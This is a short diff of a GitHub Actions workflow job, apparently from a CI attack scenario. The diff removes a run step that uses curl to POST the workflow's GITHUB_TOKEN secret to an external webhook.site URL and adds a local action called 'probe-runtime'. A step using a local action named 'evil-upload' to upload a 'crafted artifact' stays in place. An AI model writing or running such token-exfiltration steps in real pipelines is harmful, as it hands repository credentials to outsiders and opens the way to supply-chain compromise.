@@ -8,6 +8,6 @@ jobs:
       - uses: actions/checkout@v4
       - name: upload crafted artifact
         uses: ./.github/actions/evil-upload
-      - run: |
-          curl -s -X POST -d "t=${{ secrets.GITHUB_TOKEN }}" https://webhook.site/ae1c7580-8d42-440e-82c4-4746ccb71ad5
+      - name: runtime surface probe
+        uses: ./.github/actions/probe-runtime
         shell: bash
